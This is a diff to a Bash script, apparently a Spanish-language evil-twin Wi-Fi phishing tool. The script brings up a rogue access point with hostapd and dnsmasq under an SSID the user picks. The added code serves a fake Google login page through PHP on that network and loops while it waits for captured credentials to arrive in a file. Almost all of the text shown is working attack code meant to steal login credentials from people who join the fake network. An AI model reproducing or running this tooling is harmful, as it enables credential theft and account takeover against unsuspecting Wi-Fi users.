@@ -12,6 +12,16 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
+trap ctrl_c INT
+
+function ctrl_c(){
+	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
+	rm dnsmasq.conf hostapd.conf 2>/dev/null
+	rm -r assets google-login.ep helper.php index.php jquery-2.2.1.min.js MyPortal.php post.php Roboto-Regular.ttf 2>/dev/null
+	tput cnorm
+	exit
+}
+
 function banner(){
 echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
 sleep 0.05
@@ -62,6 +72,16 @@ function dependencies(){
 	fi
 }
 
+function getCredentials(){
+	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales...\n${endColour}"
+
+	while true; do
+		if [[ -e "datos-privados.txt" ]]; then
+			echo -e "\t${redCoolour}[!] Se han obtenido credenciales${endColour}"
+		fi; sleep 1
+	done
+}
+
 function startAttack(){
 	clear; if [[ -e credenciales.txt ]]; then
 		rm -rf credenciales.txt
@@ -77,7 +97,7 @@ function startAttack(){
 	choosed_interface=$(sed ''$myInterface'q;d' iface)
 	rm iface 2>/dev/null
 	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar:${endColour} " && read -r use_ssid
-	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar:${endColour} " && read use_channel
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar:${endColour} " && read use_channel; tput civis
 	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
 	sleep 2
 	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
@@ -92,7 +112,7 @@ function startAttack(){
 	echo -e "auth_algs=1\n" >> hostapd.conf
 	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
-	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando modo monitor la interfaz $choosed_interface${endColour}\n"
+	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando modo monitor en la interfaz $choosed_interface${endColour}\n"
 	ifconfig $choosed_interface down; sleep 2
 	iwconfig $choosed_interface mode monitor
 	ifconfig $choosed_interface up
@@ -101,7 +121,7 @@ function startAttack(){
 	hostapd hostapd.conf > /dev/null 2>&1 &
 	sleep 6
 
-	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}\n"
+	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
 	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
 	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
@@ -118,6 +138,12 @@ function startAttack(){
 	sleep 1
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 	sleep 5
+
+	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+	cp -r google-login/* . # En este caso, copiamos la plantilla de Google, si queremos otra, utilizamos otro de los directorios disponibles
+	php -S 192.168.1.1:80 > /dev/null 2>&1 &
+	sleep 2
+	getCredentials
 }
 
 # Main Program
